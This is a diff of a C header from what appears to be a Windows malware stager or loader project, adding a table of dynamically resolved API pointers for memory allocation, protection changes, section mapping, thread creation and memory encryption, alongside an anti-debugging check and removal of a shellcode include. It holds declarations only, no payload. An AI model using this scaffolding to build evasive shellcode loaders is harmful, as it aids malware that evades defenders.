@@ -4,7 +4,6 @@
 
 #include <macros.h>
 #include <native.h>
-#include <shellcode.h>
 #include <obfuscation/chacha.h>
 
 #ifdef STAGER
@@ -107,3 +106,27 @@ BOOL HwbpCheck(
     void
 );
 
+BOOL InitInstance(
+    void
+);
+
+typedef struct _INSTANCE {
+    PTEB Teb;
+    struct {
+        HMODULE  (WINAPI *LoadLibraryExA)(LPCSTR lpLibFileName, HANDLE hFile, DWORD dwFlags);
+        WINBOOL  (WINAPI *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
+        LPVOID   (WINAPI *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+        WINBOOL  (WINAPI *WriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
+        HANDLE   (WINAPI *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
+        HANDLE   (WINAPI *CreateFileMappingA)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName);
+        LPVOID   (WINAPI *MapViewOfFile)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
+        HMODULE  (WINAPI *LoadLibraryA)(LPCSTR lpLibFileName);
+        DWORD    (WINAPI *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
+        NTSTATUS (NTAPI *NtCreateSection)(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
+        NTSTATUS (NTAPI *NtMapViewOfSection)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, SECTION_INHERIT InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
+        NTSTATUS (NTAPI *SystemFunction040)( PVOID Memory, ULONG MemorySize, ULONG OptionFlags );
+        VOID     (__stdcall *BlackoutMain)( PVOID );
+    } Win32;
+} INSTANCE, *PINSTANCE;
+
+extern INSTANCE Instance;
